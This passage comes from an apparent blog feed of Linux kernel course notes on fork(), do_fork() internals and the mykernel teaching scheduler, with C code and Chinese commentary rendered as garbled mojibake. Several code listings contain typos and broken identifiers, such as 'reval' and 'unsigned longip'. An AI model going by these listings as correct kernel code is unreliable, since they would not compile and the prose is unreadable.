&lt;li>è¿ç¨å¯ä»¥çåç¨åºçä¸æ¬¡æ§è¡è¿ç¨ãå¨linuxä¸ï¼æ¯ä¸ªè¿ç¨æå¯ä¸çPIDæ è¯è¿ç¨ãPIDæ¯ä¸ä¸ªä»1å°32768çæ­£æ´æ°ï¼å¶ä¸­1ä¸è¬æ¯ç¹æ®è¿ç¨initï¼å¶å®è¿ç¨ä»2å¼å§ä¾æ¬¡ç¼å·ãå½ç¨å®32768åï¼ä»2éæ°å¼å§ã&lt;/li>
&lt;li>linuxä¸­æä¸ä¸ªå«è¿ç¨è¡¨çç»æç¨æ¥å­å¨å½åæ­£å¨è¿è¡çè¿ç¨ãå¯ä»¥ä½¿ç¨âps auxâå½ä»¤æ¥çæææ­£å¨è¿è¡çè¿ç¨ã&lt;/li>
&lt;li>è¿ç¨å¨linuxä¸­åæ ç¶ç»æï¼initä¸ºæ ¹èç¹ï¼å¶å®è¿ç¨åæç¶è¿ç¨ï¼æè¿ç¨çç¶è¿ç¨å°±æ¯å¯å¨è¿ä¸ªè¿ç¨çè¿ç¨ï¼è¿ä¸ªè¿ç¨å«åç¶è¿ç¨çå­è¿ç¨ã&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>[ä¸è¿°æèª:
&lt;a href="http://www.cnblogs.com/leoo2sk/archive/2009/12/11/talk-about-fork-in-linux.html" target="_blank" rel="noopener">ä»ä¸éé¢è¯é¢è°linuxä¸forkçè¿è¡æºå¶]&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;!-- more -->
&lt;p>ä¸é¢åæä¸ä¸ªç®åçä¾å­:&lt;/p>
&lt;pre>&lt;code class="language-C">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
int main(int argc, char * argv[])
{
int pid;
/* fork another process */
pid = fork();
if (pid &amp;lt; 0)
{
/* error occurred */
fprintf(stderr,&amp;quot;Fork Failed!&amp;quot;);
exit(-1);
}
else if (pid == 0)
{
/* child process */
printf(&amp;quot;This is Child Process!\n&amp;quot;);
}
else
{
/* parent process */
printf(&amp;quot;This is Parent Process!\n&amp;quot;);
/* parent will wait for the child to complete*/
wait(NULL);
printf(&amp;quot;Child Complete!\n&amp;quot;);
}
}
&lt;/code>&lt;/pre>
&lt;p>æ¯è¾ç®å,è¿è¡ç»æä¸º:&lt;/p>
&lt;pre>&lt;code class="language-bash">This is Child Process!
This is Parent Process!
Child Complete!
&lt;/code>&lt;/pre>
&lt;p>&lt;strong>å¨pid = fork()å,åªæä¸ä¸ªè¿ç¨æ§è¡è¿æ®µä»£ç &lt;/strong>,ä½å¨è¿æ¡è¯­å¥æ»å,å°±æä¸¤ä¸ªè¿ç¨å¨æ§è¡åé¢çä»£ç äº,æ¥ä¸æ¥çä»£ç æ¯:&lt;/p>
&lt;p>&lt;code>if(pid.....)&lt;/code>&lt;/p>
&lt;p>è¡¥å: forkè¯­å¥çè¿åå¼,forkç³»ç»è°ç¨è°ç¨ä¸æ¬¡, è¿åä¸¤æ¬¡, å¨è¿éæå¯è½æä¸ç§è¿åå¼&lt;/p>
&lt;ul>
&lt;li>å¨ç¶è¿ç¨ä¸­ï¼&lt;strong>forkè¿åæ°åå»ºå­è¿ç¨çè¿ç¨ID&lt;/strong>&lt;/li>
&lt;li>å¨å­è¿ç¨ä¸­ï¼forkè¿å0&lt;/li>
&lt;li>å¦æåºç°éè¯¯ï¼forkè¿åä¸ä¸ªè´å¼&lt;/li>
&lt;/ul>
&lt;p>ææå¨è¿æ®µä»£ç ä¸­, å¦æpid = fork()æ§è¡æå, é£å°±æä¸¤ä¸ªè¿ç¨äº, ä¸ä¸ªç¶è¿ç¨åä¸ä¸ªå­è¿ç¨, å¨å­è¿ç¨ä¸­ï¼forkå½æ°è¿å0ï¼å¨ç¶è¿ç¨ä¸­ï¼forkè¿åæ°åå»ºå­è¿ç¨çè¿ç¨IDãæä»¬å¯ä»¥éè¿forkè¿åçå¼æ¥å¤æ­å½åè¿ç¨æ¯å­è¿ç¨è¿æ¯ç¶è¿ç¨ã&lt;/p>
&lt;p>forkåºéå¯è½æä¸¤ç§åå ï¼&lt;/p>
&lt;ul>
&lt;li>å½åçè¿ç¨æ°å·²ç»è¾¾å°äºç³»ç»è§å®çä¸éï¼è¿æ¶errnoçå¼è¢«è®¾ç½®ä¸ºEAGAINãç³»ç»åå­ä¸è¶³ï¼è¿æ¶errnoçå¼è¢«è®¾ç½®ä¸ºENOMEMã&lt;/li>
&lt;li>åå»ºæ°è¿ç¨æååï¼ç³»ç»ä¸­åºç°ä¸¤ä¸ªåºæ¬å®å¨ç¸åçè¿ç¨ï¼&lt;strong>è¿ä¸¤ä¸ªè¿ç¨æ§è¡æ²¡æåºå®çååé¡ºåºï¼åªä¸ªè¿ç¨åæ§è¡è¦çç³»ç»çè¿ç¨è°åº¦ç­ç¥&lt;/strong>ã&lt;/li>
&lt;/ul>
&lt;p>åèåæ:
&lt;a href="http://blog.csdn.net/jason314/article/details/5640969" target="_blank" rel="noopener">linuxä¸­forkï¼ï¼å½æ°è¯¦è§£ï¼ååï¼ï¼å®ä¾è®²è§£ï¼&lt;/a>&lt;/p>
&lt;h1 id="forkå¯¹åºçç³»ç»è°ç¨è¿ç¨">forkå¯¹åºçç³»ç»è°ç¨è¿ç¨&lt;/h1>
&lt;p>å¨ Linux åæ ¸ä¸­,ä¾ç¨æ·åå»ºè¿ç¨çç³»ç»è°ç¨fork()å½æ°çååºå½æ°æ¯ sys_fork()ãsys_clone()ãsys_vfork()ã&lt;br>
è¿ä¸ä¸ªå½æ°&lt;strong>é½æ¯éè¿è°ç¨åæ ¸å½æ° do_fork() æ¥å®ç°ç&lt;/strong>ãæ ¹æ®è°ç¨æ¶æä½¿ç¨ç clone_flags åæ°ä¸åï¼do_fork() å½æ°å®æçå·¥ä½ä¹åå¼ãä¸é¢åædo_fork(), è¯¥å½æ°ä¸»è¦ä½ç¨æ¯å¤å¶åæ¥çè¿ç¨æä¸ºå¦ä¸ä¸ªæ°çè¿ç¨ï¼å®å®æäºæ´ä¸ªè¿ç¨çåå»ºè¿ç¨ã&lt;/p>
&lt;h2 id="do_forkå½æ°çå ä¸ªåæ°">do_fork()å½æ°çå ä¸ªåæ°:&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>clone_flagsï¼è¯¥æ å¿ä½ç4ä¸ªå­èåä¸ºä¸¤é¨åãæä½çä¸ä¸ªå­èä¸ºå­è¿ç¨ç»ææ¶åéç»ç¶è¿ç¨çä¿¡å·ä»£ç ï¼éå¸¸ä¸ºSIGCHLDï¼å©ä½çä¸ä¸ªå­èåæ¯åç§cloneæ å¿çç»åãéè¿cloneæ å¿å¯ä»¥æéæ©çå¯¹ç¶è¿ç¨çèµæºè¿è¡å¤å¶ãä¾å¦CLONE_VMè¡¨ç¤ºå±äº«åå­æè¿°ç¬¦åææçé¡µè¡¨ï¼ CLONE_FSå±äº«æ ¹ç®å½åå½åå·¥ä½ç®å½æå¨çè¡¨ä»¥åæéæ©ç ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>statck_startï¼å­è¿ç¨ç¨æ·æå æ çå°åï¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>regsï¼æåpt_regsç»æä½çæéãå½ç³»ç»åçç³»ç»è°ç¨ï¼å³ç¨æ·è¿ç¨ä»ç¨æ·æåæ¢å°åæ ¸ææ¶ï¼è¯¥ç»æä½ä¿å­éç¨å¯å­å¨ä¸­çå¼ï¼å¹¶è¢«å­æ¾äºåæ ¸æçå æ ä¸­ï¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>stack_sizeï¼æªè¢«ä½¿ç¨ï¼éå¸¸è¢«èµå¼ä¸º0ï¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>parent_tidptrï¼ç¶è¿ç¨å¨ç¨æ·æä¸pidçå°åï¼è¯¥åæ°å¨CLONE_PARENT_SETTIDæ å¿è¢«è®¾å®æ¶ææä¹ï¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>child_tidptrï¼å­è¿ç¨å¨ç¨æ·æä¸pidçå°åï¼è¯¥åæ°å¨CLONE_CHILD_SETTIDæ å¿è¢«è®¾å®æ¶ææä¹ã&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="do_fork-å½æ°çæä¸ä¸ªæ°çè¿ç¨">do_fork() å½æ°çæä¸ä¸ªæ°çè¿ç¨&lt;/h2>
&lt;ul>
&lt;li>å»ºç«è¿ç¨æ§å¶ç»æå¹¶èµåå¼ï¼ä½¿å¶æä¸ºè¿ç¨æ åãè¿ä¸ªè¿ç¨å®æä»¥ä¸åå®¹ã&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;ol>
&lt;li>å¨åå­ä¸­åéä¸ä¸ª task_struct æ°æ®ç»æï¼ä»¥ä»£è¡¨å³å°äº§ççæ°è¿ç¨ã&lt;/li>
&lt;li>æç¶è¿ç¨ PCB çåå®¹å¤å¶å°æ°è¿ç¨ç PCB ä¸­ã&lt;/li>
&lt;li>**ä¸ºæ°è¿ç¨åéä¸ä¸ªå¯ä¸çè¿ç¨æ è¯å· PID å user_struct ç»æã**ç¶åæ£æ¥ç¨æ·å·ææ§è¡ä¸ä¸ªæ°è¿ç¨æå¿é¡»å·æçèµæºã&lt;/li>
&lt;li>éæ°è®¾ç½® task_struct ç»æä¸­é£äºä¸ç¶è¿ç¨å¼ä¸åçæ°æ®æåã&lt;/li>
&lt;li>è®¾ç½®è¿ç¨ç®¡çä¿¡æ¯ï¼æ ¹æ®ææä¾ç clone_flags åæ°å¼ï¼å³å®æ¯å¦å¯¹ç¶è¿ç¨ task_struct ä¸­çæé fs ãfiles æéç­æéæ©çé¨åè¿è¡æ·è´ï¼å¦æ clone_flags åæ°ææçæ¯å±äº«èä¸æ¯æ·è´ï¼åå°å¶è®¡æ°å¨ count çå¼å  1 ï¼å¦åå°±æ·è´æ°è¿ç¨æéè¦çç¸å³ä¿¡æ¯åå®¹ PCB ãè¿ä¸ªå°æ¹æ¯åºå sys_fork() è¿æ¯ sys_clone() ã&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;ul>
&lt;li>å¿é¡»ä¸ºæ°è¿ç¨çæ§è¡è®¾ç½®è·è¸ªè¿ç¨æ§è¡æåµçç¸å³åæ ¸æ°æ®ç»æãåæ¬ ä»»å¡æ°ç»ãèªç±æ¶é´åè¡¨ tarray_freelist ä»¥å pidhash[] æ°ç»ãè¿é¨åå®æå¦ä¸åå®¹ï¼&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;ol>
&lt;li>ææ°è¿ç¨å å¥å°è¿ç¨é¾è¡¨ä¸­&lt;/li>
&lt;li>ææ°è¿ç¨å å¥å° pidhash æ£åè¡¨ä¸­ï¼å¹¶å¢å ä»»å¡è®¡æ°å¼ã&lt;/li>
&lt;li>éè¿æ·è´ç¶è¿ç¨çä¸ãä¸ææ¥åå§åç¡¬ä»¶çä¸ä¸æï¼TSSæ®µãLDTä»¥å GDTï¼ã&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;ul>
&lt;li>å¯å¨è°åº¦ç¨åºï¼ä½¿å­è¿ç¨è·å¾è¿è¡çæºä¼ãè¿é¨åå®æä»¥ä¸å¨ä½ï¼&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;ol>
&lt;li>è®¾ç½®æ°çå°±ç»ªéåç¶æ TASK_RUNING , å¹¶å°æ°è¿ç¨æå°å°±ç»ªéåä¸­ï¼å¹¶éæ°å¯å¨è°åº¦ç¨åºä½¿å¶è¿è¡ã&lt;/li>
&lt;li>åç¶è¿ç¨è¿åå­è¿ç¨ç PIDï¼è®¾ç½®å­è¿ç¨ä» do_fork() è¿å 0 å¼ã&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;pre>&lt;code class="language-C"> int do_fork(unsigned long clone_flags,unsigned long stack_start, struct pt_regs *regs,
unsigned long stack_size)
{
int retval;
struct task_struct *p;
struct completion vfork;
retval = -EPERM ;
if ( clone_flags &amp;amp; CLONE_PID )
{
if ( current-&amp;gt;pid )
goto fork_out;
}
reval = -ENOMEM ;
p = alloc_task_struct(); // åéåå­å»ºç«æ°è¿ç¨ç task_struct ç»æ
if ( !p )
goto fork_out;
*p = *current ; //å°å½åè¿ç¨ç task_struct ç»æçåå®¹å¤å¶ç»æ°è¿ç¨ç PCBç»æ
retval = -EAGAIN;
//ä¸é¢ä»£ç å¯¹ç¶ãå­è¿ç¨ task_struct ç»æä¸­ä¸åå¼çæ°æ®æåè¿è¡èµå¼
if ( atomic_read ( &amp;amp;p-&amp;gt;user-&amp;gt;processes ) &amp;gt;= p-&amp;gt;rlim[RLIMIT_NPROC].rlim_cur
&amp;amp;&amp;amp; !capable( CAP_SYS_ADMIN ) &amp;amp;&amp;amp; !capable( CAP_SYS_RESOURCE ))
goto bad_fork_free;
atomic_inc ( &amp;amp;p-&amp;gt;user-&amp;gt;__count); //count è®¡æ°å¨å  1
atomic_inc ( &amp;amp;p-&amp;gt;user-&amp;gt;processes); //è¿ç¨æ°å  1
if ( nr_threads &amp;gt;= max_threads )
goto bad_fork_cleanup_count ;
get_exec_domain( p-&amp;gt;exec_domain );
if ( p-&amp;gt;binfmt &amp;amp;&amp;amp; p-&amp;gt;binfmt-&amp;gt;module )
__MOD_INC_USE_COUNT( p-&amp;gt;binfmt-&amp;gt;module ); //å¯æ§è¡æä»¶ binfmt ç»æå±äº«è®¡æ° + 1
p-&amp;gt;did_exec = 0 ; //è¿ç¨æªæ§è¡
p-&amp;gt;swappable = 0 ; //è¿ç¨ä¸å¯æ¢åº
p-&amp;gt;state = TASK_UNINTERRUPTIBLE ; //ç½®è¿ç¨ç¶æ
copy_flags( clone_flags,p ); //æ·è´è¿ç¨æ å¿ä½
p-&amp;gt;pid = get_pid( clone_flags ); //ä¸ºæ°è¿ç¨åéè¿ç¨æ å¿å·
p-&amp;gt;run_list.next = NULL ;
p-&amp;gt;run_list.prev = NULL ;
p-&amp;gt;run_list.cptr = NULL ;
init_waitqueue_head( &amp;amp;p-&amp;gt;wait_childexit ); //åå§å wait_childexit éå
p-&amp;gt;vfork_done = NULL ;
if ( clone_flags &amp;amp; CLONE_VFORK ) {
p-&amp;gt;vfork_done = &amp;amp;vfork ;
init_completion(&amp;amp;vfork) ;
}
spin_lock_init( &amp;amp;p-&amp;gt;alloc_lock );
p-&amp;gt;sigpending = 0 ;
init_sigpending( &amp;amp;p-&amp;gt;pending );
p-&amp;gt;it_real_value = p-&amp;gt;it_virt_value = p-&amp;gt;it_prof_value = 0 ; //åå§åæ¶é´æ°æ®æå
p-&amp;gt;it_real_incr = p-&amp;gt;it_virt_incr = p-&amp;gt;it_prof_incr = 0 ; //åå§åå®æ¶å¨ç»æ
init_timer( &amp;amp;p-&amp;gt;real_timer );
p-&amp;gt;real_timer.data = (unsigned long)p;
p-&amp;gt;leader = 0 ;
p-&amp;gt;tty_old_pgrp = 0 ;
p-&amp;gt;times.tms_utime = p-&amp;gt;times.tms_stime = 0 ; //åå§åè¿ç¨çåç§è¿è¡æ¶é´
p-&amp;gt;times.tms_cutime = p-&amp;gt;times.tms_cstime = 0 ;
#ifdef CONFIG_SMP //åå§åå¯¹ç§°å¤çå¨æå
{
int i;
p-&amp;gt;cpus_runnable = ~0UL;
p-&amp;gt;processor = current-&amp;gt;processor ;
for( i = 0 ; i &amp;lt; smp_num_cpus ; i++ )
p-&amp;gt;per_cpu_utime[ i ] = p-&amp;gt;per_cpu_stime[ i ] = 0;
spin_lock_init ( &amp;amp;p-&amp;gt;sigmask_lock );
}
#endif
p-&amp;gt;lock_depth = -1 ; // æ³¨æï¼è¿é -1 ä»£è¡¨ no ,è¡¨ç¤ºå¨ä¸ä¸æåæ¢æ¶ï¼åæ ¸ä¸ä¸é
p-&amp;gt;start_time = jiffies ; // è®¾ç½®è¿ç¨çèµ·å§æ¶é´
INIT_LIST_HEAD ( &amp;amp;p-&amp;gt;local_pages );
retval = -ENOMEM ;
if ( copy_files ( clone_flags , p )) //æ·è´ç¶è¿ç¨ç files æéï¼å±äº«ç¶è¿ç¨å·²æå¼çæä»¶
goto bad_fork_cleanup ;
if ( copy_fs ( clone_flags , p )) //æ·è´ç¶è¿ç¨ç fs æéï¼å±äº«ç¶è¿ç¨æä»¶ç³»ç»
goto bad_fork_cleanup_files ;
if ( copy_sighand ( clone_flags , p )) //å­è¿ç¨å±äº«ç¶è¿ç¨çä¿¡å·å¤çå½æ°æé
goto bad_fork_cleanup_fs ;
if ( copy_mm ( clone_flags , p ))
goto bad_fork_cleanup_mm ; //æ·è´ç¶è¿ç¨ç mm ä¿¡æ¯ï¼å±äº«å­å¨ç®¡çä¿¡æ¯
retval = copy_thread( 0 , clone_flags , stack_start, stack_size , p regs );
//åå§å TSSãLDTä»¥åGDTé¡¹
if ( retval )
goto bad_fork_cleanup_mm ;
p-&amp;gt;semundo = NULL ; //åå§åä¿¡å·éæå
p-&amp;gt;prent_exec_id = p-self_exec_id ;
p-&amp;gt;swappable = 1 ; //è¿ç¨å ç¨çåå­é¡µé¢å¯æ¢åº
p-&amp;gt;exit_signal = clone_flag &amp;amp; CSIGNAL ;
p-&amp;gt;pdeatch_signal = 0 ; //æ³¨æï¼è¿éæ¯ç¶è¿ç¨æ¶äº¡ååéçä¿¡å·
p-&amp;gt;counter = (current-&amp;gt;counter + 1) &amp;gt;&amp;gt; 1 ;//è¿ç¨å¨æä¼åçº§ï¼è¿éè®¾ç½®æç¶è¿ç¨çä¸å,åºæ³¨æçæ¯ï¼è¿éæ¯éç¨ä½æä½æ¥å®ç°çã
current-&amp;gt;counter &amp;gt;&amp;gt; =1;
if ( !current-&amp;gt;counter )
current-&amp;gt;need_resched = 1 ; //ç½®ä½éæ°è°åº¦æ è®°ï¼å®éä¸ä»è¿ä¸ªå°æ¹å¼å§ï¼åè£æäºç¶å­ä¸¤ä¸ªè¿ç¨ã
retval = p-&amp;gt;pid ;
p-&amp;gt;tpid = retval ;
INIT_LIST_HEAD( &amp;amp;p-&amp;gt;thread_group );
write_lock_irq( &amp;amp;tasklist_lock );
p-&amp;gt;p_opptr = current-&amp;gt;p_opptr ;
p-&amp;gt;p_pptr = current-&amp;gt;p_pptr ;
if ( !( clone_flags &amp;amp; (CLONE_PARENT | CLONE_THREAD ))) {
p-&amp;gt;opptr = current ;
if ( !(p-&amp;gt;ptrace &amp;amp; PT_PTRACED) )
p-&amp;gt;p_pptr = current ;
}
if ( clone_flags &amp;amp; CLONE_THREAD ){
p-&amp;gt;tpid = current-&amp;gt;tpid ;
list_add ( &amp;amp;p-&amp;gt;thread_group,&amp;amp;current-&amp;gt;thread_group );
}
SET_LINKS(p);
hash_pid(p);
nr_threads++;
write_unlock_irq( &amp;amp;tasklist_lock );
if ( p-&amp;gt;ptrace &amp;amp; PT_PTRACED )
send_sig( SIGSTOP , p ,1 );
wake_up_process(p); //ææ°è¿ç¨å å¥è¿è¡éåï¼å¹¶å¯å¨è°åº¦ç¨åºéæ°è°åº¦ï¼ä½¿æ°è¿ç¨è·å¾è¿è¡æºä¼
++total_forks ;
if ( clone_flags &amp;amp; CLONE_VFRK )
wait_for_completion(&amp;amp;vfork);
//ä»¥ä¸æ¯åºéå¤çé¨å
fork_out:
return retval;
bad_fork_cleanup_mm:
exit_mm(p);
bad_fork_cleanup_sighand:
exit_sighand(p);
bad_fork_cleanup_fs:
exit_fs(p);
bad_fork_cleanup_files:
exit_files(p);
bad_fork_cleanup:
put_exec_domain( p-&amp;gt;exec_domain );
if ( p-&amp;gt;binfmt &amp;amp;&amp;amp; p-&amp;gt;binfmt-&amp;gt;module )
__MOD_DEC_USE_COUNT( p-&amp;gt;binfmt-&amp;gt;module );
bad_fork_cleanup_count:
atomic_dec( &amp;amp;p-&amp;gt;user-&amp;gt;processes );
free_uid ( p-&amp;gt;user );
bad_fork_free:
free_task_struct(p);
goto fork_out;
}
&lt;/code>&lt;/pre>
&lt;h1 id="å®éª">å®éª&lt;/h1>
&lt;p>å®éªæ¯å¨å®éªæ¥¼å®æç:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-13-Linux-kernel-analysis-building-task/2018-09-19-01-45-16.png" alt="">&lt;/p>
&lt;p>æ»ç»:
&lt;strong>æ°è¿ç¨çæ§è¡èµ·ç¹ä¸º: ret_form_fork&lt;/strong>&lt;/p>
&lt;p>å½ä»ä»ret_from_forkéåºæ¶ï¼ä¼ä»å æ ä¸­å¼¹åºåæ¥ä¿å­çeipï¼èipæåkernel_thread_helper,&lt;/p>
&lt;p>è³æ­¤kernel_thread_helperè¢«è°ç¨ï¼ä»å°±è½å¤è¿è¡æä»¬çæå®çå½æ°äºdo_exit().
do_forkçæ§è¡æµç¨å¯å¦ä¸å¾è¡¨ç¤º:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-13-Linux-kernel-analysis-building-task/2018-09-19-01-45-40.png" alt="">&lt;/p>
&lt;p>å¾æèª:
&lt;a href="http://www.ahlinux.com/start/base/6893.html" target="_blank" rel="noopener">Linuxè¿ç¨åæ¢&lt;/a>&lt;/p></description></item><item><title>Linuxåæ ¸åæè¯¾ç¨2_æä½ç³»ç»æ¯å¦ä½å·¥ä½ç</title><link>http://www.guozet.me/post/Linux-Kernel-analysis-Os-work-copy/</link><pubDate>Sun, 01 Mar 2015 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Linux-Kernel-analysis-Os-work-copy/</guid><description>&lt;p>Linuxåæ ¸è¯¾ç¬¬äºå¨ä½ä¸ãæ¬æå¨äºè¯¾å ä¸­å®éªæ¥¼å®æã&lt;br>
&lt;a href="http://guozet.me/about/" target="_blank" rel="noopener">åå½æ³½&lt;/a> ååä½åè½¬è½½è¯·æ³¨æåºå¤.&lt;br>
&lt;a href="http://mooc.study.163.com/course/USTC-1000029000" target="_blank" rel="noopener">ãLinuxåæ ¸åæãMOOCè¯¾ç¨&lt;/a>&lt;/p>
&lt;h1 id="è®¡ç®æºæ¯å¦ä½å·¥ä½çå°ç»">è®¡ç®æºæ¯å¦ä½å·¥ä½çï¼å°ç»ï¼&lt;/h1>
&lt;h2 id="æ¦å¿µ">æ¦å¿µ&lt;/h2>
&lt;p>è®¡ç®æºçå·¥ä½ï¼ä¸è¨ä»¥è½ä¹ï¼æ§è¡ç¨åºçè¿ç¨ï¼ä¹å°±æ¯å­å¨ç¨åºå
&lt;a href="http://baike.baidu.com/view/922446.htm" target="_blank" rel="noopener">ç¨åºæ§å¶&lt;/a>çè¿ç¨ã&lt;/p>
&lt;ul>
&lt;li>å­å¨ç¨åºè®¡ç®æºå·¥ä½æ¨¡åï¼è®¡ç®æºç³»ç»ææåºç¡æ§çé»è¾ç»æ&lt;/li>
&lt;li>å½æ°è°ç¨å æ ï¼é«çº§è¯­è¨å¾ä»¥è¿è¡çåºç¡&lt;/li>
&lt;li>ä¸­æ­ï¼å¤éç¨åºæä½ç³»ç»çåºç¹&lt;/li>
&lt;/ul>
&lt;h2 id="ä»¥ä¾åæ">ä»¥ä¾åæ&lt;/h2>
&lt;p>
&lt;a href="https://github.com/mengning/mykernel" title="mykernel" target="_blank" rel="noopener">ä¸ä¸ªç®åçä¸­æ­çä¾å­&lt;/a>(ç¹å»è¿å¥)&lt;/p>
&lt;h3 id="ç®è¦åæmymaincä¸myinterruptc">ç®è¦åæmymain.cä¸myinterrupt.c&lt;/h3>
&lt;pre>&lt;code class="language-c">void __init my_start_kernel(void) // mymain.cä¸­ä¸»è¦åå®¹
{
int i = 0;
while (1) {
i++;
if (i % 100000 == 0) //æ¯å¾ªç¯åä¸æ¬¡æå°ä¸æ¬¡my_start_kernel here
printk(KERN_NOTICE &amp;quot;my_start_kernel here %d \n&amp;quot;, i);
}
}
void my_timer_handler(void) //æ¯æ¬¡æ¶éä¸­æ­è°ç¨ä¸æ¬¡ myinterrupt.cä¸­ä¸»è¦åå®¹
{
printk(KERN_NOTICE
&amp;quot;\n&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;my_timer_handler here&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;\n\n&amp;quot;);
}
&lt;/code>&lt;/pre>
&lt;p>å¯è§ï¼è¿åªæ¯ä¸ä¸ªå¾ç®åçæ¶éä¸­æ­æ¼ç¤ºå®éªï¼æ§è¡ç»æå¦ä¸æç¤ºï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-06-15-Linux-Kernel-analysis-Os-work/2018-09-19-01-12-35.png" alt="">&lt;/p>
&lt;p>å¯ä»¥æ¸æ¥ççå°ï¼æ¶éæ¯è®°æ°å°åä¸çæ¶åï¼æå°ä¸ä¸ªmy_start_kernel hereï¼æ¶éä¸­æ­çæ¶åæ§è¡my_time_hander here.&lt;/p>
&lt;h3 id="å¨ç¬¬ä¸ä¸ªçåºç¡ä¸è¿è¡æ¶é´çè½®è½¬å¤éç¨åºçå°os">å¨ç¬¬ä¸ä¸ªçåºç¡ä¸è¿è¡æ¶é´çè½®è½¬å¤éç¨åºçå°os.&lt;/h3>
&lt;p>&lt;strong>ä¸»è¦å¯¹mypcb.h, mymain.c åmyinterrupt.cè¿ä¸ä¸ªæä»¶è¿è¡åæ&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>mypcb.h&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-c">/ * linux/mykernel/**mypcb.h**
* Kernel internal PCB types
* Copyright (C) 2013 Mengning
*/
#define MAX_TASK_NUM 4
#define KERNEL_STACK_SIZE 1024*8
/* CPU-specific state of this task */
struct Thread {//ç»ä»»å¡å®ä¹ä¸ä¸ªeipåesp
unsigned longip;
unsigned longsp;
};
typedef struct PCB{
int pid;//ä»»å¡ç¼å·
volatile long state;/* -1 unrunnable, 0 runnable, &amp;gt;0 stopped */
char stack[KERNEL_STACK_SIZE]; //å®ä¹æ ç©ºé´
/* CPU-specific state of this task */
struct Thread thread; //å®ä¹è¿ç¨çç»æä½thread, å¶ä¸­æeipåesp
unsigned longtask_entry;//ä»»å¡çå½æ°èµ·å§å¤, ä¹å°±æ¯ä»»å¡ç¬¬ä¸æ¬¡æ§è¡çèµ·å§ä½ç½®
struct PCB *next;//ä¸ä¸ªä»»å¡é¾è¡¨, æåä¸ä¸ä¸ªä»»å¡
}tPCB;
void my_schedule(void);//ä»»å¡è°å¨å½æ°**
&lt;/code>&lt;/pre>
&lt;ol start="2">
&lt;li>mymain.c&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-c">/* linux/mykernel/mymain.c
* Kernel internal my_start_kernel
* Copyright (C) 2013 Mengning
*/
#include &amp;lt;linux/types.h&amp;gt;
#include &amp;lt;linux/string.h&amp;gt;
#include &amp;lt;linux/ctype.h&amp;gt;
#include &amp;lt;linux/tty.h&amp;gt;
#include &amp;lt;linux/vmalloc.h&amp;gt;
#include &amp;quot;mypcb.h&amp;quot; //å¼å¥å¶ä¸­ä¸¤ä¸ªç»æä½è¡¨ç¤º**
tPCB task[MAX_TASK_NUM];//å®ä¹ä¸¤ä¸ªæ°ç»
tPCB * my_current_task = NULL;
volatile int my_need_sched = 0;//å®ä¹æ¯å¦è°åº¦, 1åè°åº¦, 0åä¸è°åº¦
void my_process(void);
void __init my_start_kernel(void) **//èµ·å§å½æ°ä½ç½®**
{
int pid = 0;
int i;
/* Initialize process 0*/
task[pid].pid = pid;
task[pid].state = 0;/* -1 unrunnable, 0 runnable, &amp;gt;0 stopped */
task[pid].task_entry = task[pid].thread.ip = (unsigned long)my_process;
task[pid].thread.sp = (unsigned long)&amp;amp;task[pid].stack[KERNEL_STACK_SIZE-1]; //0å·è¿ç¨æ å¨æå¼å§çä½ç½®**
task[pid].next = &amp;amp;task[pid];//ä¸ä¸ä¸ªä»»å¡ä¹æ¯èªå·±ï¼å¨è¿éï¼å¶ä»ä»»å¡è¿æ²¡æåå»º
/*fork more process *///åå»ºå¤ä¸ªä»»å¡
for(i=1;i&amp;lt;MAX_TASK_NUM;i++)
{
memcpy(&amp;amp;task[i],&amp;amp;task[0],sizeof(tPCB));//å¤å¶0å·è¿ç¨çç»æå½¢å¼
task[i].pid = i;
task[i].state = -1;//åå§çä»»å¡(é¤0å·è¿ç¨å¤)é½è®¾ç½®ææªè¿è¡
task[i].thread.sp = (unsigned long)&amp;amp;task[i].stack[KERNEL_STACK_SIZE-1];
task[i].next = task[i-1].next;//æ°forkçè¿ç¨å å°è¿ç¨é¾è¡¨çå°¾é¨, è¯¥æ°å»ºä»»å¡çnextæåä¸ä¸ä¸ªä»»å¡çnext,ä¹å°±æ¯èªå·±ï¼æåä¸ä¸ªï¼
task[i-1].next = &amp;amp;task[i]; //éç½®ä¸ä¸ä¸ªä»»å¡çnextæåè¿æ¶åæ°åå»ºçä»»å¡
}
/* start process 0 by task[0] */
pid = 0;
my_current_task = &amp;amp;task[pid];//åè®©0å·è¿ç¨åæ§è¡
asm volatile(
&amp;quot;movl %1,%%esp\n\t&amp;quot; /* set task[pid].thread.sp to esp */
&amp;quot;pushl %1\n\t&amp;quot; /* push ebp ,å½åesp=ebp*/
&amp;quot;pushl %0\n\t&amp;quot; /* push task[pid].thread.ip */
&amp;quot;ret\n\t&amp;quot; /* pop task[pid].thread.ip to eip */
